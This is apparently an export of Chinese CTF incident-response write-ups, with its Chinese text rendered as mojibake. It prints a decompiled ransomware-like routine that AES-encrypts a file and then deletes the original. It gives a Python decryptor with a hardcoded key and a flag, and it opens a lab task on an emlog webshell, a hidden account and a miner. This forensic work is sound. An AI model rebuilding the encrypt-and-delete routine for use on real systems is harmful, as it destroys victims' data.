[esp-8h] [ebp-1B4h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp-4h] [ebp-1B0h]</span><br>  DWORD v17; <span class="hljs-comment">// [esp-4h] [ebp-1B0h]</span><br>  <span class="hljs-type">char</span> v18[<span class="hljs-number">176</span>]; <span class="hljs-comment">// [esp+4h] [ebp-1A8h] BYREF</span><br>  <span class="hljs-type">int</span> v19[<span class="hljs-number">46</span>]; <span class="hljs-comment">// [esp+B4h] [ebp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> v20[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+174h] [ebp-38h] BYREF</span><br>  <span class="hljs-type">char</span> v21[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+17Ch] [ebp-30h] BYREF</span><br>  DWORD dwBufLen; <span class="hljs-comment">// [esp+188h] [ebp-24h]</span><br>  HCRYPTKEY phKey; <span class="hljs-comment">// [esp+18Ch] [ebp-20h] BYREF</span><br>  DWORD pdwDataLen; <span class="hljs-comment">// [esp+190h] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v25; <span class="hljs-comment">// [esp+197h] [ebp-15h] BYREF</span><br>  HCRYPTHASH phHash; <span class="hljs-comment">// [esp+198h] [ebp-14h] BYREF</span><br>  HCRYPTPROV phProv; <span class="hljs-comment">// [esp+19Ch] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [esp+1A8h] [ebp-4h]</span><br><br>  sub_C53620(a1, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>);<br>  v28 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)sub_C54FE0((<span class="hljs-type">char</span> *)v19 + *(_DWORD *)(v19[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span>)) )<br>  &#123;<br>    v3 = sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;æ— æ³•æ‰“å¼€è¾“å…¥æ–‡ä»¶: &quot;</span>);<br>    sub_C51930(v3, a1);<br>    sub_C54FC0(sub_C53210);<br>    v28 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> sub_C55250(v19);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v16 = sub_C535E0(&amp;v25);<br>    v5 = (<span class="hljs-type">int</span> *)sub_C53FD0(v20);<br>    v13 = v5[<span class="hljs-number">1</span>];<br>    v12 = *v5;<br>    v6 = (<span class="hljs-type">int</span> *)sub_C53F70(v19);<br>    sub_C51820(v21, *v6, v6[<span class="hljs-number">1</span>], v12, v13, v16);<br>    LOBYTE(v28) = <span class="hljs-number">1</span>;<br>    sub_C56F90(v19);<br>    phProv = <span class="hljs-number">0</span>;<br>    phKey = <span class="hljs-number">0</span>;<br>    phHash = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( CryptAcquireContextA(&amp;phProv, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>u, <span class="hljs-number">0xF0000000</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( CryptCreateHash(phProv, <span class="hljs-number">0x800C</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash) )<br>      &#123;<br>        v14 = sub_C58580(a3);<br>        v7 = (<span class="hljs-type">const</span> BYTE *)sub_C57050(a3);<br>        CryptHashData(phHash, v7, v14, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ( CryptDeriveKey(phProv, <span class="hljs-number">0x660E</span>u, phHash, <span class="hljs-number">0</span>, &amp;phKey) )<br>        &#123;<br>          pdwDataLen = sub_C58580(v21);<br>          dwBufLen = pdwDataLen + <span class="hljs-number">16</span>;<br>          sub_C58150(pdwDataLen + <span class="hljs-number">16</span>);<br>          v17 = dwBufLen;<br>          v8 = (BYTE *)sub_C57050(v21);<br>          <span class="hljs-keyword">if</span> ( CryptEncrypt(phKey, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, v8, &amp;pdwDataLen, v17) )<br>          &#123;<br>            sub_C538A0(a2, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>);<br>            LOBYTE(v28) = <span class="hljs-number">2</span>;<br>            v15 = pdwDataLen;<br>            v9 = sub_C57050(v21);<br>            sub_C58C00(v18, v9, v15);<br>            sub_C56FD0(v18);<br>            v10 = (<span class="hljs-type">const</span> CHAR *)sub_C56DC0(a1);<br>            sub_C5FD86(v10);<br>            v11 = sub_C51960((<span class="hljs-type">int</span>)&amp;unk_C82138, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;åŠ å¯†å®Œæˆå¹¶åˆ é™¤åŸæ–‡ä»¶: &quot;</span>);<br>            sub_C51930(v11, a1);<br>            sub_C54FC0(sub_C53210);<br>            LOBYTE(v28) = <span class="hljs-number">1</span>;<br>            sub_C552B0(v18);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptEncrypt å¤±è´¥&quot;</span>);<br>            sub_C54FC0(sub_C53210);<br>          &#125;<br>          CryptDestroyKey(phKey);<br>          CryptDestroyHash(phHash);<br>          CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>          LOBYTE(v28) = <span class="hljs-number">0</span>;<br>          sub_C54C00(v21);<br>          v28 = <span class="hljs-number">-1</span>;<br>          <span class="hljs-keyword">return</span> sub_C55250(v19);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptDeriveKey å¤±è´¥&quot;</span>);<br>          sub_C54FC0(sub_C53210);<br>          CryptDestroyHash(phHash);<br>          CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>          LOBYTE(v28) = <span class="hljs-number">0</span>;<br>          sub_C54C00(v21);<br>          v28 = <span class="hljs-number">-1</span>;<br>          <span class="hljs-keyword">return</span> sub_C55250(v19);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptCreateHash å¤±è´¥&quot;</span>);<br>        sub_C54FC0(sub_C53210);<br>        CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>        LOBYTE(v28) = <span class="hljs-number">0</span>;<br>        sub_C54C00(v21);<br>        v28 = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">return</span> sub_C55250(v19);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptAcquireContext å¤±è´¥&quot;</span>);<br>      sub_C54FC0(sub_C53210);<br>      LOBYTE(v28) = <span class="hljs-number">0</span>;<br>      sub_C54C00(v21);<br>      v28 = <span class="hljs-number">-1</span>;<br>      <span class="hljs-keyword">return</span> sub_C55250(v19);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ Windows CryptoAPI å®Œæˆå¯¹ç§°åŠ å¯†æ“ä½œ</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ä»è¾“å…¥æ–‡ä»¶ <span class="hljs-built_in">a1</span> è¯»å–æ•°æ® â†’ ä½¿ç”¨å¯†ç ï¼ˆå¯†é’¥ä¸Šä¸‹æ–‡ <span class="hljs-built_in">a3</span>ï¼‰åŠ å¯† â†’ å°†åŠ å¯†ç»“æœå†™å…¥è¾“å‡ºæ–‡ä»¶ <span class="hljs-built_in">a2</span> â†’ åˆ é™¤åŸå§‹æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ‹·æ‰“ deepseek</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AESDecryptor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, password</span>):<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.key = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.iv = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ¨¡æ‹Ÿ CryptoAPI çš„å¯†é’¥æ´¾ç”Ÿè¿‡ç¨‹&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 1. å¯¹å¯†ç è¿›è¡Œ SHA-256 å“ˆå¸Œ</span><br>        password_bytes = <span class="hljs-variable language_">self</span>.password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        hash_obj = hashlib.sha256(password_bytes)<br>        hash_digest = hash_obj.digest()<br>        <br>        <span class="hljs-comment"># 2. å–å‰ 16 å­—èŠ‚ä½œä¸º AES-128 å¯†é’¥</span><br>        <span class="hljs-variable language_">self</span>.key = hash_digest[:<span class="hljs-number">16</span>]<br>        <br>        <span class="hljs-comment"># 3. ä½¿ç”¨é›¶å‘é‡ä½œä¸º IV (CryptoAPI é»˜è®¤è¡Œä¸º)</span><br>        <span class="hljs-variable language_">self</span>.iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[å¯†é’¥æ´¾ç”Ÿ]&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  åŸå§‹å¯†é’¥: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  SHA-256: <span class="hljs-subst">&#123;hash_digest.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES-128 å¯†é’¥: <span class="hljs-subst">&#123;self.key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  IV: <span class="hljs-subst">&#123;self.iv.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_file</span>(<span class="hljs-params">self, input_file, output_file</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;è§£å¯†æ–‡ä»¶&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># è¯»å–åŠ å¯†æ–‡ä»¶</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                encrypted_data = f.read()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ— æ³•æ‰“å¼€è¾“å…¥æ–‡ä»¶: <span class="hljs-subst">&#123;input_file&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># æ£€æŸ¥æ–‡ä»¶å¤§å°</span><br>        file_size = <span class="hljs-built_in">len</span>(encrypted_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ–‡ä»¶å¤§å°: <span class="hljs-subst">&#123;file_size&#125;</span> å­—èŠ‚&quot;</span>)<br>        <br>        <span class="hljs-comment"># åˆ›å»º AES è§£å¯†å™¨</span><br>        <span class="hljs-keyword">try</span>:<br>            cipher = AES.new(<span class="hljs-variable language_">self</span>.key, AES.MODE_CBC, <span class="hljs-variable language_">self</span>.iv)<br>            decrypted_data = cipher.decrypt(encrypted_data)<br>            <br>            <span class="hljs-comment"># ç§»é™¤ PKCS#7 å¡«å……</span><br>            <span class="hljs-keyword">try</span>:<br>                decrypted_data = unpad(decrypted_data, AES.block_size)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆåŠŸç§»é™¤ PKCS#7 å¡«å……&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è­¦å‘Š: å¡«å……éªŒè¯å¤±è´¥ï¼Œå°è¯•ç›´æ¥ä¿å­˜æœªç§»é™¤å¡«å……çš„æ•°æ®&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è§£å¯†å¤±è´¥: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># å†™å…¥è§£å¯†æ–‡ä»¶</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(decrypted_data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ— æ³•å†™å…¥è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># éªŒè¯è§£å¯†ç»“æœ</span><br>        output_size = <span class="hljs-built_in">len</span>(decrypted_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è§£å¯†æˆåŠŸ!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  è¾“å‡ºæ–‡ä»¶å¤§å°: <span class="hljs-subst">&#123;output_size&#125;</span> å­—èŠ‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  ä¿å­˜åˆ°: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># æ£€æŸ¥æ–‡ä»¶å¤´</span><br>        <span class="hljs-variable language_">self</span>.check_file_header(decrypted_data)<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_file_header</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ£€æŸ¥å¸¸è§æ–‡ä»¶å¤´&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span><br>        <br>        headers = &#123;<br>            <span class="hljs-string">b&#x27;MZ&#x27;</span>: <span class="hljs-string">&quot;Windows å¯æ‰§è¡Œæ–‡ä»¶&quot;</span>,<br>            <span class="hljs-string">b&#x27;\x7fELF&#x27;</span>: <span class="hljs-string">&quot;ELF å¯æ‰§è¡Œæ–‡ä»¶&quot;</span>,<br>            <span class="hljs-string">b&#x27;\x89PNG&#x27;</span>: <span class="hljs-string">&quot;PNG å›¾åƒ&quot;</span>,<br>            <span class="hljs-string">b&#x27;\xFF\xD8\xFF&#x27;</span>: <span class="hljs-string">&quot;JPEG å›¾åƒ&quot;</span>,<br>            <span class="hljs-string">b&#x27;PK\x03\x04&#x27;</span>: <span class="hljs-string">&quot;ZIP å‹ç¼©æ–‡ä»¶&quot;</span>,<br>            <span class="hljs-string">b&#x27;%PDF&#x27;</span>: <span class="hljs-string">&quot;PDF æ–‡æ¡£&quot;</span>,<br>            <span class="hljs-string">b&#x27;FLAG&#x27;</span>: <span class="hljs-string">&quot;å¯èƒ½åŒ…å« FLAG&quot;</span>,<br>            <span class="hljs-string">b&#x27;flag&#x27;</span>: <span class="hljs-string">&quot;å¯èƒ½åŒ…å« flag&quot;</span><br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span> signature, file_type <span class="hljs-keyword">in</span> headers.items():<br>            <span class="hljs-keyword">if</span> data.startswith(signature):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ£€æµ‹åˆ°æ–‡ä»¶å¤´: <span class="hljs-subst">&#123;signature.<span class="hljs-built_in">hex</span>().upper()&#125;</span> - <span class="hljs-subst">&#123;file_type&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>        <br>        <span class="hljs-comment"># æ£€æŸ¥å¯æ‰“å°å­—ç¬¦</span><br>        printable = <span class="hljs-built_in">sum</span>(<span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data[:<span class="hljs-number">100</span>])<br>        <span class="hljs-keyword">if</span> printable &gt; <span class="hljs-number">70</span>:  <span class="hljs-comment"># è¶…è¿‡70%å¯æ‰“å°å­—ç¬¦</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ–‡ä»¶å¼€å¤´åŒ…å«å¤§é‡å¯æ‰“å°å­—ç¬¦ï¼Œå¯èƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶&quot;</span>)<br>            <span class="hljs-comment"># å°è¯•æ˜¾ç¤ºå‰100ä¸ªå­—ç¬¦</span><br>            <span class="hljs-keyword">try</span>:<br>                preview = data[:<span class="hljs-number">100</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é¢„è§ˆ: &quot;</span> + preview)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== AES-128 æ–‡ä»¶è§£å¯†å·¥å…· ===&quot;</span>)<br>    <br>    <span class="hljs-comment"># ç¡¬ç¼–ç å¯†é’¥</span><br>    SECRET_KEY = <span class="hljs-string">&quot;secret_key_1234&quot;</span><br>    <br>    <span class="hljs-comment"># å¤„ç†å‘½ä»¤è¡Œå‚æ•°</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç”¨æ³•: python decrypt.py &lt;åŠ å¯†æ–‡ä»¶&gt; &lt;è¾“å‡ºæ–‡ä»¶&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å¯†é’¥: <span class="hljs-subst">&#123;SECRET_KEY&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç®—æ³•: AES-128-CBC&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å¯†é’¥æ´¾ç”Ÿ: SHA-256&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    input_file = sys.argv[<span class="hljs-number">1</span>]<br>    output_file = sys.argv[<span class="hljs-number">2</span>]<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¾“å…¥æ–‡ä»¶: <span class="hljs-subst">&#123;input_file&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ä½¿ç”¨å¯†é’¥: <span class="hljs-subst">&#123;SECRET_KEY&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># åˆ›å»ºè§£å¯†å™¨</span><br>    decryptor = AESDecryptor(SECRET_KEY)<br>    <br>    <span class="hljs-comment"># åˆå§‹åŒ–</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> decryptor.initialize():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†å™¨åˆå§‹åŒ–å¤±è´¥&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-comment"># è§£å¯†æ–‡ä»¶</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå¼€å§‹è§£å¯†...&quot;</span>)<br>    <span class="hljs-keyword">if</span> decryptor.decrypt_file(input_file, output_file):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè§£å¯†æˆåŠŸå®Œæˆ!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nè§£å¯†å¤±è´¥!&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>è¿è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/cdccc59b57069260.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;8e8c6b08-8adb-<span class="hljs-number">262b-0032</span>-4809c1796c3e&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç„æœº-ç¬¬å››ç« &amp;ç¬¬äº”ç« </title>
    <link href="/2025/07/24/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <url>/2025/07/24/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%AC%AC%E4%BA%94%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>Windows å®æˆ˜ - emlog &amp; evtx æ–‡ä»¶åˆ†æ</p><span id="more"></span><h1 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æœåŠ¡å™¨åœºæ™¯æ“ä½œç³»ç»Ÿ Windows<br>æœåŠ¡å™¨è´¦å·å¯†ç  administrator xj<span class="hljs-comment">@123456</span><br><br><span class="hljs-number">1</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell,å°†é»‘å®¢æ¤å…¥ shell çš„å¯†ç  ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ <span class="hljs-built_in">IP</span> ä¸ºå¤šå°‘,å°†é»‘å®¢ <span class="hljs-built_in">IP</span> ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°,å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º FLAG æäº¤<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>.é€šè¿‡æœ¬åœ° <span class="hljs-built_in">PC</span> RDPåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå,å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º(ä»…åŸŸå)FLAG æäº¤<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="æ‰¾åˆ°é»‘å®¢æ¤å…¥-shell-çš„å¯†ç "><a href="#æ‰¾åˆ°é»‘å®¢æ¤å…¥-shell-çš„å¯†ç " class="headerlink" title="æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell çš„å¯†ç "></a>æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell çš„å¯†ç </h2><p>æ‰«æç½‘ç«™æ ¹ç›®å½•ï¼Œæ‰¾åˆ° shell çš„è·¯å¾„ï¼š&#x2F;content&#x2F;plugins&#x2F;tip&#x2F;shell.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/00ce1e539ec6fd5b.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 